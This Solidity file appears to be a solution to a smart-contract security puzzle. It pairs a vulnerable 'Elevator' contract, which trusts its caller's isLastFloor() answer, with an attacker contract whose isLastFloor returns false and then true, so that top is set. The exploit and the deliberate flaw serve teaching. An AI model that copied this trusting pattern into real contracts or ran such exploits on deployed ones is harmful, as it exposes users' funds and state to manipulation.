// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract building{
    mapping (uint=>bool) public up;
    uint public x=0;
    Elevator elevator;
    
    
    constructor(address _elevator) public{
        elevator = Elevator(_elevator);
    }
   function toTheTop() public{
        elevator.goTo(1);
    }
    function isLastFloor(uint _x) external returns (bool){x++;
        if(x==1){
            up[_x]=false;
       return false;
       }
       else{
           up[_x]=true;
           return true;
       }

    }
}